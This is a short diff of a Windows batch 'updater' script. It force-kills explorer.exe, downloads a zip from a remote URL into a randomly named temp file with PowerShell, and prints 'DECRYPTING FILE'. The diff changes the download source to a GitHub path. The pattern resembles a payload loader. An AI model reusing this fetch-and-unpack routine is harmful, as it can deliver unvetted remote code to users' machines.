@@ -13,7 +13,7 @@ Taskkill /F /IM explorer.exe >nul 2>&1
 
 echo Searching for Updates...
 timeout 1 >NUL
-C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Invoke-WebRequest http://horizongames.ml/bloot/updates/latest.zip -OutFile %temp%\%Random1%.zip
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Invoke-WebRequest https://github.com/PancakeBoiii/Blaze3/blob/main/Updates/latest.zip -OutFile %temp%\%Random1%.zip
 
 title LOADING ARCHIVE
 echo DECRYPTING FILE
